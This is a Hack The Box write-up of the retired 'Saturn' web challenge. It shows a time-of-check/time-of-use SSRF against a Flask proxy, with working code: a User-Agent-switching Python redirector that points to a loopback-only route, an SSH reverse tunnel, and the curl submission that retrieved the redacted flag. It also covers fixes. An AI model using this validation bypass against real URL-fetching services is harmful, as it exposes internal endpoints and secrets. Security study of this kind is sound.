---
title: "Hack The Box Challenge — Saturn"
summary: "Saturn's proxy checks a URL with SafeURL but fetches it again with Requests. A response that changes between those requests turns the second fetch into SSRF."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Web"
difficulty: "Easy"
solvedAt: 2026-11-19
publishedAt: 2026-11-19
tags:
  - web-security
  - ssrf
  - toctou
  - url-validation
  - http-redirects
tools:
  - Web browser
  - Python 3
  - curl
  - OpenSSH
  - Pinggy
cves: []
htbUrl: "https://app.hackthebox.com/challenges/Saturn"
cover: "/images/writeups/hackthebox/challenges/shared/hackthebox-challenge-cover.webp"
coverAlt: "Abstract cybersecurity challenge medallion with terminal, puzzle and network motifs"
featured: false
draft: false
---

> **Authorized-lab notice:** This documents our solve of the retired Hack The Box Saturn challenge. On 19 November 2026, its HTB page displayed **Writeup Available**, stated that write-ups unlock when content is retired, and showed **User Owns Flag**. The real flag, temporary instance and tunnel addresses, and original challenge package are not published.

Browse more [Hack The Box write-ups](/writeups/) or the [retired Challenges archive](/writeups/challenges/).

## Executive summary

Saturn exposes a web proxy form: enter a URL and the site displays the fetched page. Its supplied Flask source shows two outbound requests to the same user-controlled URL. `SafeURL-Python` makes the first request and checks its destination, including redirects. If that succeeds, `requests.get(url)` makes a fresh request with no equivalent destination check.

We hosted a small Python HTTP server that answered `200 OK` to the SafeURL client's request and `302 Found` to the later Python Requests client. The redirect pointed to `http://127.0.0.1:1337/secret`, an endpoint that serves the flag only to a caller on the target's own loopback interface. A temporary public tunnel made our HTTP server reachable from the challenge container. The final `curl` submission returned a flag-shaped value, which is redacted here. This is a **time-of-check to time-of-use (TOCTOU) SSRF**: the application validated one response but consumed another.

## Challenge information and supplied files

| Item | Value |
| --- | --- |
| Challenge | `Saturn` |
| Category | Web |
| Difficulty | Easy |
| Publication status | Retired, verified on 19 November 2026 |
| Challenge page | [Hack The Box — Saturn](https://app.hackthebox.com/challenges/Saturn) |
| Supplied material | ZIP containing a Flask application and Docker build files |

The extracted `web_saturn/` directory contained `challenge/app.py`, `flag.txt`, `requirements.txt`, templates, static files, a Dockerfile and a build script. The local `flag.txt` came with the challenge package; the objective was to retrieve the value from the **remote instance**. We did not copy the ZIP or source tree into this portfolio.

The challenge presented a simple **Saturn Proxy** page with an **Enter URL** field and a **Search** button. The remote instance used an ephemeral public host and port, so commands below use `http://<HOST>:<PORT>/`.

## Source review: two requests and a local-only route

We read the relevant files with:

```bash
cd ~/Hackthebox/Saturn/web_saturn
sed -n '1,260p' challenge/app.py
cat challenge/requirements.txt
```

The important part of `index()` has this structure (abridged from the supplied source):

```python
url = request.form['url']
su = safeurl.SafeURL()
opt = safeurl.Options()
opt.enableFollowLocation().setFollowLocationLimit(0)
su.setOptions(opt)
su.execute(url)

r = requests.get(url)
return render_template('index.html', result=r.text)
```

An exception in the SafeURL call produces **“Malicious input detected.”** A successful call discards the response body. The application then fetches the original URL again with `requests.get` and displays **that** response. `requirements.txt` pinned `SafeURL-Python==1.3` and `requests==2.31.0`.

The second route explains the target:

```python
@app.route('/secret')
def secret():
    if request.remote_addr == '127.0.0.1':
        # Read ./flag.txt and render secret.html
        ...
    else:
        return render_template('forbidden.html'), 403
```

The Flask application listens on internal port `1337`. The public HTB port is only the port mapped to the container; a request *from the container to itself* must use `127.0.0.1:1337`. Visiting `/secret` from our browser would present the forbidden page because the browser is not the target's loopback client.

## Finding the check/use mismatch

Our first hypothesis was a redirect to the loopback route. Reviewing the [SafeURL-Python implementation](https://github.com/IncludeSecurity/safeurl-python/blob/main/safeurl/safeurl.py) corrected an important detail: `setFollowLocationLimit(0)` means **unlimited redirects**, not zero redirects. SafeURL follows each redirect itself and revalidates the destination. A static `302` to `127.0.0.1` would therefore be rejected during the first fetch. We did not submit that static redirect to the target as a successful exploit.

The weakness is that the second request is independent. We could make the **same public URL** return different responses to different clients. The SafeURL request uses PycURL; the second request uses Python Requests, whose default User-Agent begins with `python-requests`. Our redirector used this difference to serve a harmless `200` to the first client and a `302` to the second. [Requests follows redirects by default](https://requests.readthedocs.io/en/stable/user/quickstart/), and the second fetch does not reapply the SafeURL policy.

## Building the redirector

The following is the small script we created and ran on Kali. Its behavior depends on the request's User-Agent, so it does not need a timing race or a one-use counter:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ua = self.headers.get("User-Agent", "")
        is_requests = "python-requests" in ua.lower()
        print(f"User-Agent: {ua!r} -> {'302' if is_requests else '200'}", flush=True)

        if is_requests:
            self.send_response(302)
            self.send_header("Location", "http://127.0.0.1:1337/secret")
            self.end_headers()
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")

HTTPServer(("127.0.0.1", 8000), Handler).serve_forever()
```

We saved it as `redirector.py` and started it with `python3 redirector.py`. Binding to `127.0.0.1:8000` kept the helper local on Kali. The target could not reach that address directly: its own `127.0.0.1` refers to the target, not our machine.

In a second terminal, we exposed the helper through a temporary Pinggy HTTP tunnel:

```bash
ssh -p 443 -R0:localhost:8000 free.pinggy.io
```

Pinggy returned a temporary HTTPS URL. Its role was only to relay traffic from the HTB container to our local redirector. The tunnel URL used in the solve was temporary and is redacted. [Pinggy's quickstart](https://pinggy.io/docs/) documents this SSH reverse-tunnel command.

## Validating both responses

Before submitting the tunnel URL to Saturn, we verified each branch from a third terminal. The actual URL is replaced with a placeholder:

```bash
PUBLIC_URL='https://<TEMPORARY-TUNNEL-URL>'
curl -si "$PUBLIC_URL" | head
curl -si -A 'python-requests/2.31.0' "$PUBLIC_URL" | head
```

The retained terminal output showed:

```http
HTTP/1.0 200 OK
Content-Type: text/plain

HTTP/1.0 302 Found
Location: http://127.0.0.1:1337/secret
```

That established the behavior we needed: the public URL served a benign response to a normal client and a loopback redirect to a Requests-style client. It did not, by itself, prove how the target's two outbound requests were logged; the final remote response provided that validation.

## Remote submission and validation

With the helper and tunnel still running, we submitted the public URL to the challenge's URL field using `curl`:

```bash
TARGET='http://<HOST>:<PORT>/'
curl -sS -X POST "$TARGET" \
  --data-urlencode "url=$PUBLIC_URL" |
  grep -oE 'HTB\{[^}]+\}'
```

The command printed one `HTB{...}` value from the remote response. The actual value is intentionally omitted. The HTB page subsequently displayed **User Owns Flag** and a completion banner. Together, the output and HTB completion state confirm that the remote `/secret` content was reached.

## Why the technique works

The decisive sequence is:

1. Saturn receives a public tunnel URL supplied in the proxy form.
2. SafeURL fetches that URL. Our server answers `200 OK`, so the safety check passes.
3. Saturn fetches the same URL again with `requests.get`.
4. Our server recognizes the Requests User-Agent and answers `302` to `http://127.0.0.1:1337/secret`.
5. Requests follows the redirect. From the Flask application's perspective, the resulting `/secret` request originates from the container's loopback address, satisfying `request.remote_addr == '127.0.0.1'`.
6. The proxy returns the secret page's body to us.

This is a deterministic change of response between two requests, rather than a race won by precise timing. The public tunnel was a way to make the response-changing server reachable; it was not the vulnerability itself.

## What we ruled out

- **A direct request to loopback:** The supplied source makes `/secret` local-only and SafeURL blacklists loopback destinations. The source review, rather than a retained target response, is the evidence for this restriction.
- **A plain redirect-only URL:** SafeURL's `0` redirect limit means unlimited redirects and validation at each hop. We rejected this approach after reading the library source; it was not a successful remote test.
- **Using the public HTB port inside the redirect:** The Flask source listens internally on `1337`. The public instance port is not the destination for an in-container loopback request.

## Defensive perspective

The application should use the body returned by its validated fetch instead of making a second request to the original, mutable URL. If it must fetch again, it needs to revalidate the full redirect chain and resolved destination for that actual request. Outbound network controls should also prevent the web application from reaching loopback and other internal services through user-supplied URLs. A check that runs in one HTTP client does not automatically protect a different client invoked later.

## Key takeaways

- A URL check can itself make a network request; discard-and-refetch designs create a check/use gap.
- Redirect protection must apply to the request whose response is ultimately consumed.
- `127.0.0.1` is relative to the machine making the request. An SSRF can make a remote server satisfy its own local-only access check.
- Verify library option semantics in the implementation. Here, a redirect limit of `0` meant *unlimited*, which changed the exploit plan.
- Keep the evidence boundary clear: the local `200`/`302` test and final remote flag output were observed; target-side request logs were not retained.

## References

- [Hack The Box — Saturn](https://app.hackthebox.com/challenges/Saturn) — challenge scenario, supplied package, retired status and completion state.
- [Hack The Box write-up and streaming guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines) — publication guidance for retired content.
- [SafeURL-Python source](https://github.com/IncludeSecurity/safeurl-python/blob/main/safeurl/safeurl.py) — redirect-limit semantics and per-hop validation.
- [Requests quickstart](https://requests.readthedocs.io/en/stable/user/quickstart/) — default redirect behavior.
- [Pinggy quickstart](https://pinggy.io/docs/) — temporary SSH tunnel syntax.
